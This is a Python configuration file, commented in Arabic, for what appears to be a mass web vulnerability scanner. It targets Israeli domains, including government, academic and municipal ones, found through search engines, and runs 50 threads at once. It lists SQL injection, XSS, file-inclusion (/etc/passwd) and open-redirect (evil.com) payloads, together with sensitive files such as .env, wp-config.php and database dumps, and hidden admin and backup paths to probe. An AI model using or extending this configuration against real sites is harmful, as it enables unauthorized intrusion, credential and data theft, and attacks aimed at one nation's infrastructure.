import os

class Config:
    # إعدادات عامة
    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    TIMEOUT = 30
    MAX_THREADS = 50
    
    # إعدادات البحث
    ISRAELI_TLDS = ['.il', '.co.il', '.org.il', '.gov.il', '.ac.il', '.muni.il']
    SEARCH_ENGINES = ['google', 'bing', 'duckduckgo']
    
    # إعدادات الأمان
    MAX_DEPTH = 3
    RATE_LIMIT = 1  # ثواني بين الطلبات
    
    # إعدادات التخزين
    RESULTS_DIR = 'results'
    LOGS_DIR = 'logs'
    
    # أنواع الثغرات للكشف
    VULNERABILITY_PATTERNS = {
        'sql_injection': [
            "' OR 1=1",
            "' UNION SELECT",
            "admin'--",
            "1' OR '1'='1"
        ],
        'xss': [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>"
        ],
        'lfi': [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd"
        ],
        'open_redirect': [
            "//evil.com",
            "https://evil.com",
            "evil.com"
        ]
    }
    
    # ملفات حساسة للبحث
    SENSITIVE_FILES = [
        'robots.txt',
        'sitemap.xml',
        '.htaccess',
        'web.config',
        'config.php',
        'database.php',
        'admin.php',
        'login.php',
        '.env',
        'backup.sql',
        'dump.sql',
        'wp-config.php',
        'configuration.php'
    ]
    
    # دلائل الملفات المخفية
    HIDDEN_DIRECTORIES = [
        '/admin',
        '/administrator',
        '/backup',
        '/backups',
        '/test',
        '/dev',
        '/development',
        '/staging',
        '/old',
        '/temp',
        '/tmp',
        '/logs',
        '/uploads',
        '/files',
        '/config',
        '/include',
        '/includes',
        '/cgi-bin',
        '/wp-admin',
        '/wp-content',
        '/wp-includes'
    ]